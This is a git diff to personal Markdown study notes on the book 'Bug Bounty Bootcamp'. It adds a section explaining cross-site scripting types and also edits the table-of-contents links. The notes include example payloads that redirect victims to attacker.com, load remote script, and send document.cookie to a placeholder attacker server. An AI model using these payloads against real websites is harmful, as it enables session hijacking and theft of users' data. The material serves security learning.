@@ -7,10 +7,10 @@
 - [Chapter 3: How the Internet Works](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-3-how-the-internet-works)
 - [Chapter 4: Environmental Setup and Traffic Interception](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#environmental-setup-and-traffic-interception)
 - [Chapter 5: Web Hacking Reconnaissance](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#chapter-5-web-hacking-reconnaissance)
-  - [Google Dorking](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#google-dorking)
+  - [Google Dorking](https://github.com/Xerips/BookNotes/blob/main/BugBugBountyBootcamp.md#google-dorking)
   - [Scope Discovery](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#scope-discovery)
   - [Writing Your Own Recon Scripts](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#writing-your-own-recon-scripts)
-- [Chapter 6: Cross-Site Scripting](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp.md#)
+- [Chapter 6: Cross-Site Scripting](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#cross-site-scripting)
 
 ### Chapter 1: Picking a Bug Bounty Program
 
@@ -991,5 +991,123 @@ diff <SCAN AT TIME 1> <SCAN AT TIME 2>`
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
 
 ### Cross-site Scripting
+
+- Cross-site scripting vulnerabilities are one of the most common web vulnerabilities (As of 2020, but they're still quite common).
+
+#### Mechanisms
+
+- "In an XSS attack, the attacker injects an executable script into HTML pages viewed by the user. This means that to understand XSS, you'll have to first understand JavaScript and HTML syntax"
+- Here's an HTML syntax [cheat sheet](https://web.stanford.edu/group/csp/cs21/htmlcheatsheet.pdf) found on Stanford University's website.
+- Here's a JavaScript syntax [cheat sheet](https://www.codewithharry.com/blogpost/javascript-cheatsheet/) from codewithharry.com.
+
+- In HTML, look for the <script></script> tags.
+- When you find <script></script> tags embedded in HTML files, you're looking at an "inline" script. That is to say, they're embedded in the HTML of the page, and not loaded from an external file.
+  - These are great targets to test for XSS.
+- An example of an inline script:
+
+```
+<h1>Welcome to my site.</h1>
+<h3>This is a cybersecurity newsletter that focuses on bug bounty news and write-ups. Please subscribe to my newsletter below to receive new cybersecurity articles in your email inbox.</h3>
+<form action="/subscribe" method="post">
+  <label for="email">Email:</label><br>
+  <input type="text" id="email" value="Please enter your email.">
+  <br><br>
+  <input type="submit" value="Submit">
+</form>
+```
+
+- The confirmation HTML looks like this:
+
+```
+<p>Thanks! You have subscribed <b>user@gmail.com</b> to the newsletter.</p>
+```
+
+- If the user were to submit `<script>location="http://attacker.com;</script>` into the email field, and the website doesn't validate or sanitize the user input, their source code would become, `<p>Thanks! You have submitted <b><script>location="http://attacker.com";</script></b> to the newsletter.</p>`
+- Validating user input: The application checks that the user input meets a certain standard - like not containing malicious code or follows some sort of structural guide.
+- Sanitizing user input: The application modifies special characters in the input that can be use to interfere with HTML logic before processing.
+- The `src` attribute of the HTML <script> tag allows you to load JavaScript from an external source.
+  - `<script src=http://attacker.com/xss.js></script>` will execute the contents of http://attacker.com/xss.js in the victim's browser.
+  - This is not very useful, because the attacker can only redirect themselves to the attack website.
+- If the website allows users to subscribe to the service by visiting a URL like "https://subscribe.example.com?email=SUBSCRIBER_EMAIL" to automatically subscribe after visiting the URL, the attacker can inject the script by tricking users into visiting a malicious URL like, `https://subscribe.example.com?email=<script>location="http://attacker.com";</script>`
+  - The malicious script get incorporated into the page and the victim's browser will think the script is part of that site.
+  - The injected script can then access any resources that the browser stores for that site (cookies, session tokens, etc.).
+  - This can be used to steal user information that can then be used to bypass access controls.
+- To steal cookies by making the victim's broswer send a request to the attacker's IP with the victim's cookie as a URL parameter, you could use something like the following:
+  `<script>image = new Image();
+image.src='http://attacker_server_ip/?c='+document.cookie;</script>`
+  - This script contains JavaScript to load an image from the attacker's server with the user's cookies as part of the request.
+- XSS can be used to execute actions on the victim's behalf, modify the webpage the victim is viewing, read the victim's sensitive information (CSRF tokens, credit card numbers, and any other details rendered on their page)
+
+#### Types of XSS
+
+Stored XSS (Includes Blind XSS), Reflected XSS, DOM-based XSS.
+
+- The difference between these types is how the XSS payload travels before it gets delivered to the victim users.
+
+**Stored XSS**
+
+- When user input is stored on a server and retrieved unsafely.
+- "When an application accepts user input without validation, stores it in its servers, and then renders it on users' browsers without sanitization, malicious JavaScript code can make its way into the database and then to victim's browsers."
+- Stored XSS is the most severe XSS type.
+  - This is because it can attack the most amount of users.
+- In the worst case scenario, all a user would need to do to become a victim is to view a page that has the payload embedded in it.
+- You can inject the script in the application's user database, in their server logs, on a message board, or in a comment field.
+  - Every time a user accesses the stored information, the XSS executes in their browser.
+  - ex.: If you find a comment field on a blog that is vulnerable to XSS, an attack can submit a comment with JavaScript code and have that code executed by any user who views the blog post.
+- Proof of Concept (POC) for XSS: generate a pop-up on the victim's browser:
+  `<p><script>alert('Vulnerable to XSS');</script></p>`
+  - Here's what it could look like in the HTML of a vulnerable comment section:
+  ```
+  <h2>Regular User's message</h2>
+  <p>What a great post!</p>
+  <h2>Attacker's message</h2>
+  <p><script>alert('Vulnerable to XSS')</script></p>
+  ```
+  - In this example, the attackers message won't be shown in the comment section because it is interpreted as a script. If successful, the pop-up alert will be displayed instead.
+
+**Blind XSS**
+
+- "_Blind_ XSS vulnerabilities are stored XSS vulnerabilities whose malicious input is stored by the server and executed in another part of the application or in another application that you cannot see."
+- Blind XSS can be used to attack administrators (by submitting XSS payloads to support staff through ticketing portals, for example), exfiltrate data, and compromise their accounts.
+
+**Reflected XSS**
+
+- "_Reflected_ XSS vulnerabilities happen when user input is returned to the user without being stored in a database. The application takes in user input, processes it server-side, and immediately returns it to the user."
+- "These issues often happen when the server relies on user input to construct pages that display search results or error messages."
+- Example: A website has a search field that is vulnerable to Reflected XSS.
+  - When used as intended, the response might look something like this if you search "adc":
+    `<h2>You searched for abc; here are the results!</h2>`
+  - If you inject an XSS payload into the search parameter, it may look something like this:
+    `https://example.com/search?q=<script>alert('Vulnerable to XSS');</script>`
+    - After injecting the XSS payload and the website generates the new page containing the search results (or in this case our malicious payload), the attacker would then share the link to the malicious page to attack users.
+    - The benefit here is you could have a URL that looks like one people trust, but is in fact malicious.
+    - ex.: www.facebook.com/search?q=<XSSpayload>
+    - This requires the attacker to get victims to click the malicious link.
+
+**(Document Object Model) DOM-Based XSS**
+
+- "_DOM-based_ XSS is similar to reflected XSS, except that in DOM-based XSS, the user input never leaves the user's browser. In DOM-based XSS, the application takes in user input, processes it on the victim's browser, and then returns it to the user."
+- A "DOM" is a model that browsers use to render a web page.
+- A DOM represents a web page's structures which defines basic properties and behavior for each HTML element and helps scripts access and modify the contents of the page.
+- DOM-Based XSS targets the DOM directly; it attacks the client's local copy of the web page, it does not go through the server.
+- JavaScript libraries like jQuery are often subject to DOM-Based XSS because they dynamically alter DOM elements.
+- The XSS script is never sent to the server, so the HTTP response from the server doesn't change.
+- ex.: A website allows the user to change their locale by submitting to a URL parameter:
+  `https://example.com?local=north+america`
+  - Submitting this will generate a client side response similar to:
+    `<h2>Welcome, user from North America!</h2>`
+  - This submission is used locally by the user's browser with a client-side script.
+  - If the submission is not validated by the client-side script, the attacker could trick victim's into visiting a URL like:
+    `https://example.com?local=<script>location='http://attacker_server_ip/?c='+document.cookie;</script>`
+- "The user input fields that can lead to reflected and DOM-based XSS aren't always URL parameters. Sometimes they show up as URL fragments or pathnames."
+  - URL _fragments_ are strings, located at the end of a URL, that begin with a # character.
+  - Github uses these a lot to allow content creators to link to different sections within a longer .md file (like this one, you can view the RAW version of this document and see where the Table of Contents (TOC) links to different sections).
+- Information and payload examples from [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/dom-based/)
+
+**Self-XSS**
+
+- "_Self-XSS_ attacks require victims to input a malicious payload themselves. To perform these, attackers must trick users into doing much more than simply viewing a page or browsing to a particular URL."
+- "If you've ever seen social media posts or text messages telling you to paste a piece of code into your browser to "do something cool," it was probably attack code aimed at tricking you into launching self-XSS against yourself.
+- These are often out of scope, because they require you to use social engineering to attack users directly.
 
 [Back to TOC](https://github.com/Xerips/BookNotes/blob/main/BugBountyBootcamp/BugBountyBootcamp.md#table-of-contents)
